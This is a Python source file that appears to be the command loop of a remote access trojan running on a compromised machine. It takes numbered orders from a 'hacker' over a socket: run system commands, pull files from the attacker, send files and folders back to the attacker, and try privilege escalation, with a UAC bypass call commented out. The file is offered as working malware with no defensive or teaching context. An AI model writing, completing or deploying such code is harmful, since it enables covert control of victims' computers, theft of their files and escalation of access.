from core.features.command import *
from core.features.transfer_files import *
from core.features.privilage import *

def handleConnection(my_socket):
    print("[+] Handling Connection")
    keep_alive = True
    while keep_alive:
        user_option = my_socket.receive_data()
        print("[+] hacker selected option = ", user_option)
        if user_option == "1":
            print("\t\t[+] Executing System Commands")
            run_command_advanced(my_socket)
        elif user_option == "2":
            print("\t\t[+] Downloading Files from hacker")
            download_files(my_socket)

        elif user_option == "3":
            print("\t\t[+] Uploading Files to hacker")
        elif user_option == "4":
            print("\t\t[+] Uploading Folders to hacker")
        elif user_option == "5":
            print("\t\t[+] Privilage escalation")
            # execute(my_socket)
            # try_UAC_bypass(my_socket)
            try_elevating()
        elif user_option == "6":
            print("\t\t[+] Advanced Command Execution")
            run_command_advanced(my_socket)
        elif user_option == "99":
            print("\t\t[-] Exiting the main loop")
            keep_alive = False
        else:
            print("\t\t[-] Invalid input, try again")